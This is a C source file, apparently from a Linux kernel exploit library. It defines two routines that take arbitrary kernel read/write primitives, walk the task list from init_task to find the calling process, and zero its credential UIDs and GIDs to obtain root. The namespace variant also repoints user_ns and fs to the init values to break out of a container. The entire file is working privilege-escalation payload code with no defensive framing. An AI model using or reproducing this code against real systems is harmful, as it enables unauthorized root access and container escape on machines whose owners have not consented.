#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include "exploitlib.h"

int root_arbrw(uintptr_t kernbase, uint64_t (*arbread)(uintptr_t kptr), int (*arbwrite)(uintptr_t kptr, uint64_t value)) {
	//get the task struct for the task just before init_task, so that the while loop can break when real pid = 0 or real pid = 1
	uintptr_t taskptr = kernbase + INIT_TASK;
	printf("[+] Found init_task at 0x%lx\n", taskptr);
	taskptr = arbread(taskptr + TASK_LINKS_OFFSET + 8) - TASK_LINKS_OFFSET;
	pid_t pid = (pid_t)arbread(taskptr + TASK_PID_OFFSET);
	
	printf("[*] Searching for the current proccess's task struct, getpid() = %d ...\n", getpid());
	while (pid != getpid()) {
		taskptr = arbread(taskptr + TASK_LINKS_OFFSET + 8) - TASK_LINKS_OFFSET;
		pid = arbread(taskptr + TASK_PID_OFFSET);
	}
	printf("[+] Found task struct for the current process at 0x%lx\n", taskptr);
	
	//retrieve credential struct location
	uintptr_t cred = arbread(taskptr + TASK_CRED_OFFSET);
	printf("[+] Located current process's credential struct at 0x%lx\n", cred);
	
	//zero out UID, GID, etc. in the credential struct
	for (uint64_t i = 1; i <= 4; i++) {
		arbwrite(cred + i*8, 0);
	}
	printf("[*] Zeroed out UID, GID, etc. in credential struct 0x%lx\n", cred);
	
	//check for root
	if (!getuid()) {
		puts("[+] Got root!");
		return 0;
	}
	else {
		printf("[-] Failed to get root, UID = %d\n", getuid());
		return -1;
	}
	return 0;
}

int root_arbrw_ns(uintptr_t kernbase, uint64_t (*arbread)(uintptr_t kptr), int (*arbwrite)(uintptr_t kptr, uint64_t value)) {
	//get the task struct for the task just before init_task, so that the while loop can break when real pid = 0 or real pid = 1
	uintptr_t taskptr = kernbase + INIT_TASK;
	printf("[+] Found init_task at 0x%lx\n", taskptr);
	taskptr = arbread(taskptr + TASK_LINKS_OFFSET + 8) - TASK_LINKS_OFFSET;
	pid_t taskpid = (pid_t)arbread(taskptr + TASK_PID_OFFSET);
	
	//loop over all task structs, and note when vpid = getpid()
	pid_t p = getpid();
	printf("[*] Process vpid = %d\n", p);
	while (taskpid != 0 && taskpid != 1) {
		//tpid = task->thread_pid
		uintptr_t tpid = arbread(taskptr + TASK_THREADPID_OFFSET);
		
		//level = tpid->level
		unsigned int level = (unsigned int)arbread(tpid + 4);
		
		//vpid = tpid->numbers[level]
		pid_t vpid = (pid_t)arbread(tpid + PID_NUMBERS_OFFSET + level * 0x10);
		
		if (vpid == p) {
			//potential task struct found, poke the UID to see if it is the task struct for the current process
			uint32_t olduid = getuid();
			uintptr_t cred = arbread(taskptr + TASK_CRED_OFFSET);
			uint64_t uidgid = arbread(cred + 4);
			arbwrite(cred + 4, uidgid + 1);
			if (olduid != getuid()) {
				//task struct found since the current process now has a different UID
				printf("[+] Found task struct for the current process at task = 0x%lx with pid = %d, vpid = %d at level %d\n", taskptr, taskpid, vpid, level);
				arbwrite(cred + 4, uidgid);
				break;
			}
			else {
				//wrong task struct, put the UID back to what it was to avoid chaos
				arbwrite(cred + 4, uidgid);
			}
		}
		
		//set taskptr to the previous task
		taskptr = arbread(taskptr + TASK_LINKS_OFFSET + 8) - TASK_LINKS_OFFSET;
		taskpid = (pid_t)arbread(taskptr + TASK_PID_OFFSET);
	}
	
	//change credentials to root
	uintptr_t cred = arbread(taskptr + TASK_CRED_OFFSET);
	printf("[+] Found process credential struct at cred = 0x%lx\n", cred);
	for (int i=0; i<4; i++) {
		if (arbwrite(cred + 4 + 8*i, 0)) {
			puts("[-] Failed to set cred->uid, cred->gid, etc. to 0");
			return -1;
		}
	}
	puts("[+] Set cred->uid, cred->gid, etc. to 0");
	//set cred->user_ns = init_user_ns
	if (arbwrite(cred + CRED_USERNS_OFFSET, kernbase + INIT_USER_NS)) {
		puts("[-] Failed to set cred->user_ns = init_user_ns");
		return -1;
	}
	puts("[+] Set cred->user_ns = init_user_ns");
	
	if (arbwrite(taskptr + TASK_FS_OFFSET, kernbase + INIT_FS)) {
		puts("[-] Failed to set task->fs = init_fs");
		return -1;
	}
	puts("[+] Set task->fs = init_fs");

	return 0;
}
